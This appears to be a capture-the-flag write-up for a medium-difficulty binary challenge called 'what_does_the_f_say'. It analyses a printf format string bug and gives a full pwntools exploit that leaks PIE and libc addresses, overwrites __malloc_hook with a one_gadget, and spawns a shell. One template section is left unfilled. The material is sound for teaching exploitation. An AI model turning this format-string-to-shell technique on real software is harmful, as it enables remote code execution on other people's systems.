![img](https://i.imgur.com/Xw2DVAT.png)

<img src='https://i.imgur.com/heKOInX.png' style='zoom: 80%;' align=left /> <font size='10'><Challenge_Name></font>

2<sup>nd</sup> February 2025

Prepared By: `Emc235`
Author: `w3th4nds`

Difficulty: <font color='orange'>Medium</font>

# Synopsis

It is a standard format string exploitation challenge with an optional buffer overflow

## Skills Required

- Python
- Know how to use common RE tools (i.e. Ghidra, IDA)
- Format strings

## Skills Learned

- Exploit the malloc that printf uses

# Enumeration
This challenge gives us only a single binary `what_does_the_f_say`.

## Analyzing the source code
Decompiling the code with ghidra we stumble upon this function
```c
void drinks_menu(void) {
  long in_FS_OFFSET;
  int local_3c;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(local_38,0,0x1e);
  puts("\n1. Milky way (4.90 s.rocks)\n2. Kryptonite vodka (6.90 s.rocks)\n3. Deathstar(70.00 s.rocks )");
  __isoc99_scanf("%d",&local_3c);
  if (local_3c == 1) {
    srocks = srocks - 4.9;
    srock_check();
    if (srocks <= 20.0) {
      puts("\nYou have less than 20 space rocks!");
    }
    enjoy("Milky way");
  }
  else if (local_3c == 2) {
    srock_check();
    puts("\nRed or Green Kryptonite?");
    read(0,local_38,0x1d);
    printf(local_38);
    warning();
  }
  else if (local_3c == 3) {
    srocks = srocks - 69.99;
    srock_check();
    if (srocks <= 20.0) {
      puts("\nYou have less than 20 space rocks!");
    }
    enjoy("Deathstar");
  }
  else {
    puts("Invalid option!");
    goodbye();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
We notice a critical format string bug. It is a small buffer of only 29 bytes but it can still be exploited.

# Solution

## Finding the vulnerability

Explain where the vulnerability is. Be as detailed as possible so there are no logical gaps as to how you figured out the vulnerability and how you will proceed to the solution.

## Exploitation

As with every program we start by defining simple function to communicate with the program
```py
def menu(opt):
    p.recvuntil(b"\n1. Space drinks\n2. Space food\n")
    p.sendline(str(opt).encode("utf-8"))


def space_drinks(drink, payload: bytes=b""):
    if drink == 2:
        assert len(payload)
        assert len(payload) <= 0x1d
    menu(1)
    p.recvuntil(b"Deathstar(70.00 s.rocks)\n")
    p.sendline(str(drink).encode("utf-8"))
    
    if drink == 2:
        p.recvuntil(b"\nRed or Green Kryptonite?\n")
        p.send(payload)
```

Our first leak will be the ret address of `drinks_menu` (will be pointing to somewhere fox_bar). By calling `space_drinks(2, b"%15$p")` we will leak `fix_bar + 106`. Since we have bypassed PIE we can start leaking addresses of libc via the got. Of course before that we need to figure out what offset in the buffer we control. After some attempts we find that the first argument that we control is `%8$p`. Since we know what position we can control we can start leaking arbitrary addresses.
```py
space_drinks(2, b"%9$s".ljust(8, b"\x00") + p64(binary.got.puts))
leak = u64(p.recvn(6).ljust(8, b"\x00"))
log.info(f"puts   @ {hex(leak)}")

space_drinks(2, b"%9$s".ljust(8, b"\x00") + p64(binary.got.exit))
leak = u64(p.recvn(6).ljust(8, b"\x00"))
log.info(f"exit   @ {hex(leak)}")
```
After leaking these values we can head over https://libc.rip/ to input our leaks and find our exact libc ([ibc6_2.27-3ubuntu1.2_amd64](https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so)). This version of libc is very special as it is still an "old" libc and still uses malloc hooks (`__malloc_hook`, `__free_hook`).  

Now that we have the exact libc that they are using and leveraging the got leaks we completely bypassed ASLR and we can start writing to arbitrary addresses. In our case of course we can't start writing to the GOT since FULL RelRO is applied to this binary. As I mentioned the the `__malloc_hook` is present in this binary so we will be overwriting that.  

Firstly we will try to make the program jump to a fake address, inspect the registers and find the best `one_gadget` to jump.
```py
gadget = 0x4141414141414141
for i in range(6):
    payload = fmtstr_payload(8, {
        libc.symbols.__malloc_hook + i: (gadget >> i*8) & 0xFF
    }, write_size="byte")
    space_drinks(2, payload)
```
And for the trigger we will call `space_drinks(2, b"%200000x")`. This would make our program jump to our fake address because `printf` uses internally `malloc` to handle large inputs.  
At the crash site we inspect the registers and find this gadget
```py
0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv
```
Now by puting in the gadget variable `libc.address + 0x4f3c2` we will obtain RCE

### Full script

```py
#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF("./what_does_the_f_say_patched")
libc = ELF("./libc.so.6")

p = process(binary.path)

def menu(opt):
    p.recvuntil(b"\n1. Space drinks\n2. Space food\n")
    p.sendline(str(opt).encode("utf-8"))


def space_drinks(drink, payload: bytes=b""):
    if drink == 2:
        assert len(payload)
        assert len(payload) <= 0x1d
    menu(1)
    p.recvuntil(b"Deathstar(70.00 s.rocks)\n")
    p.sendline(str(drink).encode("utf-8"))
    
    if drink == 2:
        p.recvuntil(b"\nRed or Green Kryptonite?\n")
        p.send(payload)
        
    
space_drinks(2, b"%15$p")  # fox_bar + 106
binary.address = int(p.recvline().decode("utf-8").strip(), base=16) - binary.symbols.fox_bar - 106
log.info(f"binary @ {hex(binary.address)}")

# Uncomment to obtain puts and exit leaks
# space_drinks(2, b"%9$s".ljust(8, b"\x00") + p64(binary.got.puts))
# leak = u64(p.recvn(6).ljust(8, b"\x00"))
# log.info(f"puts   @ {hex(leak)}")
# space_drinks(2, b"%9$s".ljust(8, b"\x00") + p64(binary.got.exit))
# leak = u64(p.recvn(6).ljust(8, b"\x00"))
# log.info(f"exit   @ {hex(leak)}")

space_drinks(2, b"%9$s".ljust(8, b"\x00") + p64(binary.got.puts))
libc.address = u64(p.recvn(6).ljust(8, b"\x00")) - libc.symbols.puts
log.info(f"libc   @ {hex(libc.address)}")

"""
0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv
"""
gadget = libc.address + 0x4f3c2

for i in range(6):
    payload = fmtstr_payload(8, {
        libc.symbols.__malloc_hook + i: (gadget >> i*8) & 0xFF
    }, write_size="byte")
    space_drinks(2, payload)

space_drinks(2, b"%200000x")

p.interactive()

```
